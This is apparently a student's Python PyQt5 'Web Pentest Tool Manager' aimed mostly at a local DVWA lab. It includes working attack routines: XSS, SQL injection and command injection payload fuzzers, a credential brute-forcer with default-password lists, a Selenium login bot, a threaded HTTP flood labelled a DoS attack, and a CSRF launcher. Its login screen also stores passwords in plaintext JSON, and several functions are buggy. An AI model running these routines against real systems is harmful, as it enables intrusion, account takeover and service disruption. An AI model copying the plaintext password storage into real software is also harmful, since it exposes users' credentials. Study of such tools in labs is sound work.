import time
import webbrowser
from PyQt5.QtWidgets import QApplication,QWidget
from bs4 import BeautifulSoup
from PyQt5.QtWidgets import QApplication, QDialog, QMainWindow, QGraphicsDropShadowEffect, QSizeGrip, QTableWidgetItem, \
    QTextBrowser, QMessageBox
from PyQt5 import Qt,QtCore,QtGui
from PyQt5.QtCore import Qt as qt, QPropertyAnimation, QTextStream, QFile
from PyQt5.QtGui import QColor, QIcon, QStandardItemModel, QStandardItem
from PyQt5.uic import loadUi
from _LogandRegister import Ui_Form
from main import Ui_MainWindow
import requests
import datetime,socket,threading,time,sys,json,time
from selenium import webdriver
from  selenium.webdriver.common.by import By


class LogAndRegister(QWidget):

    def restore_or_maximize_window(self):
        if self.isMaximized():
            self.showNormal()
        else:
            self.showMaximized()

    def mouseMove(self, e):
        if self.isMaximized() == False:
            if e.buttons() == qt.LeftButton:
                self.move(self.pos() + e.globalPos() - self.clickPosition)
            self.clickPosition = e.globalPos()
            e.accept()

    def mousePressEvent(self, event):
        self.clickPosition = event.globalPos()

    def save_credentials(self):
        if self.ui.lineEdit_2.text() != self.ui.lineEdit_3.text():
            QMessageBox.information(self, "Register Failed", "Password does not Match!")
        elif self.ui.lineEdit.text() == "" or self.ui.lineEdit_2.text() == "" or self.ui.lineEdit_3.text() == "":
            QMessageBox.information(self, "Register Failed", "Please enter your credentials!")
        else:

            username = self.ui.lineEdit.text()
            password = self.ui.lineEdit_2.text()
            data = {username: password}

            with open("credentials.json", "a+") as file:
                file.seek(0)  # Dosyanın başına dön
                try:
                    existing_data = json.load(file)  # Önceden kaydedilmiş verileri oku
                except json.decoder.JSONDecodeError:
                    existing_data = {}

                existing_data.update(data)  # Yeni verileri mevcut verilere ekleyin
                file.seek(0)  # Dosyanın başına dön
                json.dump(existing_data, file, indent=4)  # Güncellenmiş verileri JSON formatında yaz
                file.truncate()  # Dosyanın geri kalanını kes, mevcut verilerin üzerine yazmak için
            QMessageBox.information(self, "Register successfully", "Credentials Saved!")

    def read_credentials(self, file_path):
        username = self.ui.txt_user.text()
        password = self.ui.txt_passwd.text()
        if self.ui.txt_user.text() == "" or self.ui.txt_passwd.text() == "":
            QMessageBox.information(self, "Login Failed", "Please enter your credentials!")
        with open("credentials.json", "r") as file:
            data = json.load(file)
            if username in data and data[username] == password:
                QMessageBox.information(self, "Login successfully", "Redirect to Home Page")

                time.sleep(2)
                self.login()
            else:
                QMessageBox.information(self, "Login Failed", "Wrong Password or Username!")

    def login(self):
        self.mainwindow.show()
        self.close()
    def __init__(self,main_window):
        self.mainwindow=main_window
        super().__init__()
        self.ui = Ui_Form()
        self.ui.setupUi(self)
        self.setWindowFlags(Qt.Qt.FramelessWindowHint)
        self.setAttribute(Qt.Qt.WA_TranslucentBackground)
        self.ui.max_pushButton.clicked.connect(lambda: self.restore_or_maximize_window())
        self.ui.min_pushButton.clicked.connect(lambda: self.showMinimized())
        self.ui.cancel_pushButton.clicked.connect(lambda: self.close())
        self.ui.btn_register.clicked.connect(lambda :self.ui.stackedWidget.setCurrentWidget(self.ui.register_page))
        self.ui.pushButton_8.clicked.connect(lambda :self.ui.stackedWidget.setCurrentWidget(self.ui.login_page))
        self.ui.pushButton_7.clicked.connect(lambda :self.save_credentials())
        self.ui.btn_login.clicked.connect(lambda :self.read_credentials("bitirme/credentials.json"))
        self.ui.header_frame.mouseMoveEvent = self.mouseMove



class MainWindow(QMainWindow):


    def restore_or_maximize_window(self):
        if self.isMaximized():
            self.showNormal()
        else:
            self.showMaximized()
    def mouseMove(self,e):
        if self.isMaximized() == False:
            if e.buttons() == qt.LeftButton:
                self.move(self.pos() + e.globalPos() - self.clickPosition)
            self.clickPosition = e.globalPos()
            e.accept()
    def mousePressEvent(self, event):
        self.clickPosition=event.globalPos()
    def slideLeftMenu(self):
        width = self.ui.left_menu_frame.width()
        print(width)
        if width == 45:
            newWidth=200
            print(newWidth)
        else:
            newWidth = 45
        self.animation = QPropertyAnimation(self.ui.left_menu_frame,  b"minimumWidth")
        self.animation.setDuration(250)
        self.animation.setStartValue(width)
        self.animation.setEndValue(newWidth)
        self.animation.setEasingCurve(QtCore.QEasingCurve.InOutQuart)
        self.animation.start()##
    ## XSS
    def xss_exploit(self):
        if self.ui.pushButton_17.isChecked():
            print("clicked")

        else:
            # set background color back to light-grey
            self.ui.pushButton_17.setStyleSheet("background-color : lightyellow")
        values=[]
        if self.ui.lineEdit.text()=="" or self.ui.lineEdit_2.text()=="":
            print("boş bırakılamaz")

        else:

            time.sleep(2)
            header = self.ui.lineEdit_2.text()
            result=json.loads(header)


            xss_payload_file = open("payload/xss_payload.txt", "r", encoding="utf-8")
            xss_content = xss_payload_file.read()

            for payload in xss_content.split("\n"):
                url = self.ui.lineEdit.text() + str(payload)
                sonuc = requests.get(url=url, headers=result)
                if str(payload) in str(sonuc.content):
                    values.append("status code :   "+sonuc.status_code.__str__()+"   lenght :   "+len(sonuc.content).__str__()+"   payload :   "+payload)

            self.model = QStandardItemModel()
            self.ui.listView.setModel(self.model)
            self.model.removeRows(0, self.model.rowCount())
            for i in values:

                item=QtGui.QStandardItem(i)
                self.model.appendRow(item)
    def xss_deletedItem(self):

            # if button is checked
            if self.ui.pushButton_18.isChecked():
                print("clicked")

            else:

                self.ui.listView.setModel(self.model)
                self.model.removeRows(0, self.model.rowCount())
    def xss_saveItem(self):

        # Dosya adı ve yolu belirleyin

        filename = 'xss.txt'

        # Modeldeki tüm öğeleri alın
        items = []
        for row in range(self.model.rowCount()):
            standard_item = self.model.item(row)
            items.append(standard_item.text())

        # Dosyayı yazma modunda açın ve öğeleri dosyaya yazın
        file = QFile(filename)
        if file.open(QFile.WriteOnly | QFile.Text):
            stream = QTextStream(file)
            for item in items:
                stream << item << '\n'
            file.close()
        QMessageBox.information(self, "Save Success", "XSS Payload Saved")
    ## Owasp Top Ten 2021
    def getOwaspData(self):
        url = 'https://owasp.org/Top10/'
        values=[]
        response = requests.get(url)
        soup = BeautifulSoup(response.content, 'html.parser')
        article = soup.find("article")
        h2 = article.find("h2").text
        self.ui.label_23.setText(h2)
        ul = article.find("ul").find_all("li")
        for li in ul:
            values.append(li.text)
        self.ui.listView_4.setModel(self.model)
        self.model.removeRows(0, self.model.rowCount())
        for i in values:
            item = QtGui.QStandardItem(i)
            self.model.appendRow(item)

        ## table owasp
        url1='https://owasp.org/Top10/A01_2021-Broken_Access_Control/'
        response = requests.get(url1)
        soup = BeautifulSoup(response.content, 'html.parser')
        h1=soup.find("h1")

        table = soup.find("table")
        td = table.find_all("td")
        sayac=0
        for t in td:

            self.ui.tableWidget_2.setItem(0,sayac,QTableWidgetItem(t.text))
            sayac += 1
        url2 = 'https://owasp.org/Top10/A02_2021-Cryptographic_Failures/'
        response = requests.get(url1)
        soup = BeautifulSoup(response.content, 'html.parser')
        table = soup.find("table")
        td = table.find_all("td")
        sayac = 0
        for t in td:
            self.ui.tableWidget_3.setItem(0, sayac, QTableWidgetItem(t.text))
            sayac += 1

        url3='https://owasp.org/Top10/A03_2021-Injection/'
        response = requests.get(url3)
        soup = BeautifulSoup(response.content, 'html.parser')
        table = soup.find("table")
        td = table.find_all("td")
        sayac = 0
        for t in td:
            self.ui.tableWidget_4.setItem(0, sayac, QTableWidgetItem(t.text))
            sayac += 1
        url4='https://owasp.org/Top10/A04_2021-Insecure_Design/'
        response = requests.get(url4)
        soup = BeautifulSoup(response.content, 'html.parser')
        table = soup.find("table")
        td = table.find_all("td")
        sayac = 0
        for t in td:
            self.ui.tableWidget_5.setItem(0, sayac, QTableWidgetItem(t.text))
            sayac += 1
        url5='https://owasp.org/Top10/A05_2021-Security_Misconfiguration/'
        response = requests.get(url5)
        soup = BeautifulSoup(response.content, 'html.parser')
        table = soup.find("table")
        td = table.find_all("td")
        sayac = 0
        for t in td:
            self.ui.tableWidget_6.setItem(0, sayac, QTableWidgetItem(t.text))
            sayac += 1
        url6='https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/'
        response = requests.get(url6)
        soup = BeautifulSoup(response.content, 'html.parser')
        table = soup.find("table")
        td = table.find_all("td")
        sayac = 0
        for t in td:
            self.ui.tableWidget_7.setItem(0, sayac, QTableWidgetItem(t.text))
            sayac += 1
        url7='https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/'
        response = requests.get(url7)
        soup = BeautifulSoup(response.content, 'html.parser')
        table = soup.find("table")
        td = table.find_all("td")
        sayac = 0
        for t in td:
            self.ui.tableWidget_8.setItem(0, sayac, QTableWidgetItem(t.text))
            sayac += 1
        url8='https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/'
        response = requests.get(url8)
        soup = BeautifulSoup(response.content, 'html.parser')
        table = soup.find("table")
        td = table.find_all("td")
        sayac = 0
        for t in td:
            self.ui.tableWidget_9.setItem(0, sayac, QTableWidgetItem(t.text))
            sayac += 1
        url9='https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/'
        response = requests.get(url9)
        soup = BeautifulSoup(response.content, 'html.parser')
        table = soup.find("table")
        td = table.find_all("td")
        sayac = 0
        for t in td:
            self.ui.tableWidget.setItem(0, sayac, QTableWidgetItem(t.text))
            sayac += 1
        url10='https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/'
        response = requests.get(url10)
        soup = BeautifulSoup(response.content, 'html.parser')
        table = soup.find("table")
        td = table.find_all("td")
        sayac = 0
        for t in td:
            self.ui.tableWidget_10.setItem(0, sayac, QTableWidgetItem(t.text))
            sayac += 1
    def loadCredentials(self):
        username_list = ["admin", "password,Admin"]
        password_list = ["admin", "password", "P@ssw0rd"]
        credentials=[
            {'username':'admin','password':'admin'},
            {'username':'1337','password':'123'},
            {'username':'gordonb','password':'gordonb'},
            {'username':'pablo','password':'pablo123'},
            {'username':'smithy','password':'smithy'},
            {'username':'admin','password':'password'},
            {'username':'Admin','password':'P@ssw0rd'}
        ]
        self.ui.tableWidget_11.setRowCount(len(credentials))
        self.ui.tableWidget_11.setColumnCount(2)
        self.ui.tableWidget_11.setHorizontalHeaderLabels(('Username','Password'))
        self.ui.tableWidget_11.setColumnWidth(0,200)
        self.ui.tableWidget_11.setColumnWidth(1,200)
        row_index=0
        for credential in credentials:
            self.ui.tableWidget_11.setItem(row_index,0,QTableWidgetItem(credential['username']))
            self.ui.tableWidget_11.setItem(row_index,1,QTableWidgetItem(credential['password']))
            row_index+=1
    def BrutedataSave(self):
        username=self.ui.lineEdit_5.text()
        password=self.ui.lineEdit_6.text()

        if username and password is not None:
            rowCount=self.ui.tableWidget_11.rowCount()
            self.ui.tableWidget_11.insertRow(rowCount)
            self.ui.tableWidget_11.setItem(rowCount,0,QTableWidgetItem(username))
            self.ui.tableWidget_11.setItem(rowCount,1,QTableWidgetItem(password))
    def BruteForceAttack(self):
        rows=self.ui.tableWidget_11.rowCount()
        cols=self.ui.tableWidget_11.columnCount()
        values=[]

        for row in range(rows):

            sayac=0
            url = self.ui.lineEdit_11.text()
            header=self.ui.lineEdit_10.text()
            result=json.loads(header)
            for col in range(cols):
                sayac+=1

                if sayac==1:
                    username = self.ui.tableWidget_11.item(row, col)
                    if url.__contains__("$U"):
                        url = url.replace("$U", username.text())


                elif sayac==2:

                    password = self.ui.tableWidget_11.item(row, col)

                    if url.__contains__("$P"):
                        url = url.replace("$P", password.text())
                        sonuc = requests.get(url=url, headers=result)
                        values.append(f"username   :   {username.text()} password   :   {password.text()}    Status Code   :   {sonuc.status_code}   lenght   :   {len(sonuc.content)}")
        self.model = QStandardItemModel()
        self.ui.listView_5.setModel(self.model)
        self.model.removeRows(0, self.model.rowCount())
        for i in values:
            item = QtGui.QStandardItem(i)
            self.model.appendRow(item)
    def BruteSaveFile(self):
        filename = 'bruteforce.txt'

        # Modeldeki tüm öğeleri alın
        items = []
        for row in range(self.model.rowCount()):
            standard_item = self.model.item(row)
            items.append(standard_item.text())

        # Dosyayı yazma modunda açın ve öğeleri dosyaya yazın
        file = QFile(filename)
        if file.open(QFile.WriteOnly | QFile.Text):
            stream = QTextStream(file)
            for item in items:
                stream << item << '\n'
            file.close()
    def BruteClear(self):
        self.ui.listView_5.setModel(self.model)
        self.model.removeRows(0, self.model.rowCount())
    ## Usom
    def UsomControl(self):
        values=[]
        file = open("payload/usom.txt", "r")
        text = file.read()
        file.close()

        domain = self.ui.lineEdit_12.text()
        self.ui.lineEdit_13.setText("")
        now = datetime.datetime.now()


        text=text.split("\\")
        for line in text:

            if line.__contains__(domain)==True:

                values.append(line)
                dosya = open("log.txt", "a")
                yazi = str(domain) + "zararli \nTarih  " + str(now) + "\n"
                dosya.write(yazi)
                dosya.close()
                self.ui.lineEdit_13.setText("IP zararlidir")

            elif self.ui.lineEdit_13.text()=="":
                dosya = open("log.txt", "a")
                yazi = str(domain) + "zararli değil \nTarih  " + str(now) + "\n"
                dosya.write(yazi)
                dosya.close()
                self.ui.lineEdit_13.setText("IP zararlı değildir")
        self.model = QStandardItemModel()
        self.ui.listView_6.setModel(self.model)
        self.model.removeRows(0, self.model.rowCount())
        for i in values:

            item = QtGui.QStandardItem(i)
            self.model.appendRow(item)
    def UsomItemDeleted(self):
        self.ui.listView_6.setModel(self.model)
        self.model.removeRows(0, self.model.rowCount())
    ## Nessus
    def show_content_nessus(self):
        file_path = QtCore.QUrl.fromLocalFile("C:\\Users\\vedat\\OneDrive\\Masaüstü\\dvwa.html")
        self.ui.textBrowser.setSource(file_path)
    ## Fuzzing
    def fuzzing_exploit(self):

        if self.ui.pushButton_34.isChecked():
            print("clicked")

        else:
            # set background color back to light-grey
            self.ui.pushButton_34.setStyleSheet("background-color : lightyellow")
        values = []
        if self.ui.lineEdit_15.text() == "" or self.ui.lineEdit_14.text() == "":
            print("boş bırakılamaz")

        else:


            header = self.ui.lineEdit_15.text()
            result = json.loads(header)

            fuzzing_payload_file = open("payload/fuzzing.txt", "r", encoding="utf-8")
            fuzzing_content = fuzzing_payload_file.read()

            for i in fuzzing_content.split("\n"):
                url = self.ui.lineEdit_14.text() + str(i)
                sonuc = requests.get(url=url, headers=result)
                if "200" in str(sonuc.status_code):
                    values.append(i)

            self.model=QStandardItemModel()
            self.ui.listView_7.setModel(self.model)
            self.model.removeRows(0, self.model.rowCount())
            for i in values:

                item = QtGui.QStandardItem(i)
                self.model.appendRow(item)
    def fuzzing_deletedItem(self):

        # if button is checked
        if self.ui.pushButton_35.isChecked():
            print("clicked")

        else:

            self.ui.listView.setModel(self.model)
            self.model.removeRows(0, self.model.rowCount())
    def fuzzing_saveItem(self):

        # Dosya adı ve yolu belirleyin

        filename = 'fuzzing.txt'

        # Modeldeki tüm öğeleri alın
        items = []
        for row in range(self.model.rowCount()):
            standard_item = self.model.item(row)
            items.append(standard_item.text())

        # Dosyayı yazma modunda açın ve öğeleri dosyaya yazın
        file = QFile(filename)
        if file.open(QFile.WriteOnly | QFile.Text):
            stream = QTextStream(file)
            for item in items:
                stream << item << '\n'
            file.close()
    ## Dos Attack
    def dos_attack(self):
        self.target = self.ui.lineEdit_16.text()
        self.fake_ip = '182.21.20.32'
        self.port = int(self.ui.lineEdit_17.text())

        self.attack_num = 0
        self.attack_running = True


        def attack():

            global attack_running

            while self.attack_running:

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.bind(('0.0.0.0', 0))
                s.connect((self.target, self.port))
                s.sendto(("GET /" + self.target + " HTTP/1.1\r\n").encode('ascii'), (self.target, self.port))
                s.sendto(("Host: " + self.fake_ip + "\r\n\r\n").encode('ascii'), (self.target, self.port))

                global attack_num
                self.attack_num += 1
                print(self.attack_num)
                time.sleep(0.001)
                s.close()
            self.ui.label_55.setText(self.attack_num.__str__())
            self.ui.label_57.setText("Attack Stopped")
        for i in range(1):
            thread = threading.Thread(target=attack)
            thread.start()
        self.ui.label_56.setText("attack starting")
        timer=self.ui.timeEdit.time()
        seconds = int(timer.toString("ss"))
        print(seconds)
        time.sleep(seconds)
        self.attack_running = False
    ## DVWA BOT Attack
    def dwwa_login_bot(self):
        browser = webdriver.Edge()

        url = "http://localhost/dvwa-M/login.php"
        file = open("payload/brute.text", "r")
        text = file.read()
        browser.get(url)
        values=[]
        text = text.split("\n")

        print(len(text))
        for i in text:
            try:

                username = i.split(",")

                usernameinput = browser.find_element(by=By.NAME, value='username')
                passwordinput = browser.find_element(by=By.NAME, value="password")

                # bu iki kodda “name” metodunu kullandık onuda birazdan göreceğiz.
                usernameinput.send_keys(username[0])
                passwordinput.send_keys(username[1])

                time.sleep(0.1)
                login = browser.find_element(By.XPATH, value='//*[@id="content"]/form/fieldset/p/input')

                values.append(username[0]+"  "+username[1])
                login.click()



            except Exception:
                print(username[0]+""+username[1])
                break
        self.model = QStandardItemModel()
        self.ui.listView_8.setModel(self.model)
        self.model.removeRows(0, self.model.rowCount())
        for i in values:
            item = QtGui.QStandardItem(i)
            self.model.appendRow(item)
        QMessageBox.information(self, "Save Success", values[-1])

    ## SQL INJECTION
    def sql_exploit(self):
        if self.ui.pushButton_20.isChecked():
            print("clicked")

        else:
            # set background color back to light-grey
            self.ui.pushButton_20.setStyleSheet("background-color : lightyellow")
        values=[]
        if self.ui.lineEdit_3.text()=="" or self.ui.lineEdit_4.text()=="":
            print("boş bırakılamaz")

        else:

            time.sleep(2)
            header = self.ui.lineEdit_4.text()
            result=json.loads(header)


            sql_payload_file = open("payload/sql_payload.txt", "r", encoding="utf-8")
            sql_content = sql_payload_file.read()

            for payload in sql_content.split("\n"):
                url = self.ui.lineEdit_3.text() + str(payload)
                sonuc = requests.get(url=url, headers=result)
                if "200" in str(sonuc.status_code):
                    values.append(payload)

            self.model = QStandardItemModel()
            self.ui.listView_2.setModel(self.model)
            self.model.removeRows(0, self.model.rowCount())
            for i in values:
                item=QtGui.QStandardItem(i)
                self.model.appendRow(item)
    def sql_deletedItem(self):

            # if button is checked
            if self.ui.pushButton_21.isChecked():
                print("clicked")

            else:

                self.ui.listView.setModel(self.model)
                self.model.removeRows(0, self.model.rowCount())
    def sql_saveItem(self):

        # Dosya adı ve yolu belirleyin

        filename = 'sql.txt'

        # Modeldeki tüm öğeleri alın
        items = []
        for row in range(self.model.rowCount()):
            standard_item = self.model.item(row)
            items.append(standard_item.text())

        # Dosyayı yazma modunda açın ve öğeleri dosyaya yazın
        file = QFile(filename)
        if file.open(QFile.WriteOnly | QFile.Text):
            stream = QTextStream(file)
            for item in items:
                stream << item << '\n'
            file.close()
        QMessageBox.information(self, "Save Success", "SQL Payload Saved")
    ## COMMAND INJECTİON
    def command_exploit(self):

        values=[]
        if self.ui.lineEdit_9.text()=="" or self.ui.lineEdit_8.text()=="":
            print("boş bırakılamaz")

        else:


            header = self.ui.lineEdit_9.text()
            result=json.loads(header)


            command_file = open("payload/command.txt", "r", encoding="utf-8")
            command_content = command_file.read()

            for payload in command_content.split("\n"):
                url = self.ui.lineEdit_7.text()
                data={f"ip":f"{self.ui.lineEdit_8.text()}"+payload+"","Submit":"Submit"}

                sonuc = requests.post(url=url,data=data,headers=result)
                if "DESKTOP-7UATFL9" in str(sonuc.content):
                    print(payload)
                    values.append(payload)
            self.model = QStandardItemModel()
            self.ui.listView_3.setModel(self.model)
            self.model.removeRows(0, self.model.rowCount())
            for i in values:

                item=QtGui.QStandardItem(i)
                self.model.appendRow(item)
    def command_deletedItem(self):

            # if button is checked
            if self.ui.pushButton_21.isChecked():
                print("clicked")

            else:

                self.ui.listView.setModel(self.model)
                self.model.removeRows(0, self.model.rowCount())
    def command_saveItem(self):

        # Dosya adı ve yolu belirleyin

        filename = 'sql.txt'

        # Modeldeki tüm öğeleri alın
        items = []
        for row in range(self.model.rowCount()):
            standard_item = self.model.item(row)
            items.append(standard_item.text())

        # Dosyayı yazma modunda açın ve öğeleri dosyaya yazın
        file = QFile(filename)
        if file.open(QFile.WriteOnly | QFile.Text):
            stream = QTextStream(file)
            for item in items:
                stream << item << '\n'
            file.close()
    def csrf(self):
        url = "http://localhost:63342/Python/bitirme/payload/csrf.html?_ijt=lqj8os60qi0vp0k80fqeh5gqnk&_ij_reload=RELOAD_ON_SAVE"

        webbrowser.open(url)


    def __init__(self):



        QMainWindow.__init__(self)
        self.ui=Ui_MainWindow()
        self.ui.setupUi(self)

        self.setWindowFlags(Qt.Qt.FramelessWindowHint)
        self.setAttribute(Qt.Qt.WA_TranslucentBackground)
        self.shadow=QGraphicsDropShadowEffect(self)
        self.shadow.setBlurRadius(50)
        self.shadow.setXOffset(0)
        self.shadow.setYOffset(0)
        self.shadow.setColor(QColor(0,92,157,550))
        self.ui.centralwidget.setGraphicsEffect(self.shadow)
        self.setWindowIcon(QIcon(":/feather/feather/cloud.svg"))
        self.setWindowTitle("Web Pentest Tool Manager")
        QSizeGrip(self.ui.footer_concer_frame)

        self.ui.min_pushButton.clicked.connect(lambda :self.showMinimized())
        self.ui.max_pushButton.clicked.connect(lambda :self.restore_or_maximize_window())
        self.ui.cancel_pushButton.clicked.connect(lambda :self.close())
        self.ui.pushButton_7.clicked.connect(lambda :self.ui.stackedWidget.setCurrentWidget(self.ui.xss_injection))



        self.ui.pushButton_8.clicked.connect(lambda :self.ui.stackedWidget.setCurrentWidget(self.ui.web_scrapping))
        self.ui.pushButton_9.clicked.connect(lambda :self.ui.stackedWidget.setCurrentWidget(self.ui.nessus))
        self.ui.pushButton_10.clicked.connect(lambda :self.ui.stackedWidget.setCurrentWidget(self.ui.fuzzing))
        self.ui.pushButton_11.clicked.connect(lambda :self.ui.stackedWidget.setCurrentWidget(self.ui.bot_net))
        self.ui.pushButton_12.clicked.connect(lambda :self.ui.stackedWidget.setCurrentWidget(self.ui.brute_force))
        self.ui.pushButton_13.clicked.connect(lambda :self.ui.stackedWidget.setCurrentWidget(self.ui.usom))
        self.ui.pushButton_37.clicked.connect(lambda :self.ui.stackedWidget.setCurrentWidget(self.ui.dos_attack))

        self.ui.header_frame.mouseMoveEvent=self.mouseMove
        self.ui.menu_pushButton.clicked.connect(lambda :self.slideLeftMenu())
        ####   XSS page  ###
        self.ui.pushButton_4.clicked.connect(lambda: self.ui.stackedWidget.setCurrentWidget(self.ui.command_injection))
        self.ui.pushButton_3.clicked.connect(lambda: self.ui.stackedWidget.setCurrentWidget(self.ui.sql_injection))
        self.ui.pushButton_17.clicked.connect(lambda :self.xss_exploit())
        self.ui.pushButton_18.clicked.connect(lambda :self.xss_deletedItem())
        self.ui.pushButton_19.clicked.connect(lambda :self.xss_saveItem())
        ## Sql Page ###
        self.ui.pushButton.clicked.connect(lambda :self.ui.stackedWidget.setCurrentWidget(self.ui.xss_injection))
        self.ui.pushButton_6.clicked.connect(lambda :self.ui.stackedWidget.setCurrentWidget(self.ui.command_injection))
        self.ui.pushButton_20.clicked.connect(lambda: self.sql_exploit())
        self.ui.pushButton_21.clicked.connect(lambda: self.sql_deletedItem())
        self.ui.pushButton_24.clicked.connect(lambda: self.sql_saveItem())
        ## Command Page ##
        self.ui.pushButton_2.clicked.connect(lambda: self.ui.stackedWidget.setCurrentWidget(self.ui.xss_injection))
        self.ui.pushButton_22.clicked.connect(lambda: self.ui.stackedWidget.setCurrentWidget(self.ui.sql_injection))
        self.ui.pushButton_27.clicked.connect(lambda: self.command_exploit())
        self.ui.pushButton_28.clicked.connect(lambda: self.commad_deletedItem())
        self.ui.pushButton_26.clicked.connect(lambda: self.command_saveItem())
        ## Owasp 10 2021 page ##
        self.ui.pushButton_8.clicked.connect(lambda: self.ui.stackedWidget.setCurrentWidget(self.ui.web_scrapping))
        self.ui.pushButton_23.clicked.connect(lambda :self.getOwaspData())
        ## Brute Force page ##
        self.ui.pushButton_12.clicked.connect(lambda : self.ui.stackedWidget.setCurrentWidget(self.ui.brute_force))
        self.loadCredentials()
        self.ui.pushButton_25.clicked.connect(lambda :self.BrutedataSave())
        self.ui.pushButton_30.clicked.connect(lambda :self.BruteForceAttack())
        self.ui.pushButton_31.clicked.connect(lambda :self.BruteSaveFile())
        self.ui.pushButton_29.clicked.connect(lambda :self.BruteClear())
        ## Usom Page ##
        self.ui.pushButton_13.clicked.connect(lambda :self.ui.stackedWidget.setCurrentWidget(self.ui.usom))
        self.ui.pushButton_32.clicked.connect(lambda :self.UsomControl())
        ## Nessus ##
        self.show_content_nessus()
        ## Fuzzing ##
        self.ui.pushButton_34.clicked.connect(lambda: self.fuzzing_exploit())
        self.ui.pushButton_35.clicked.connect(lambda: self.fuzzing_deletedItem())
        self.ui.pushButton_36.clicked.connect(lambda: self.fuzzing_saveItem())
        ## Dos Attack ##
        self.ui.pushButton_38.clicked.connect(lambda :self.dos_attack())
        ## Bot Net ##
        self.ui.pushButton_39.clicked.connect(lambda :self.dwwa_login_bot())
        ## CSRF ##
        self.ui.pushButton_40.clicked.connect(lambda :self.csrf())












# app=QApplication(sys.argv)
# window=MainWindow()
# dialog=QDialog()
# sys.exit(app.exec_())
app = QApplication([])
main_window=MainWindow()
login_widget=LogAndRegister(main_window)
login_widget.show()
app.exec_()

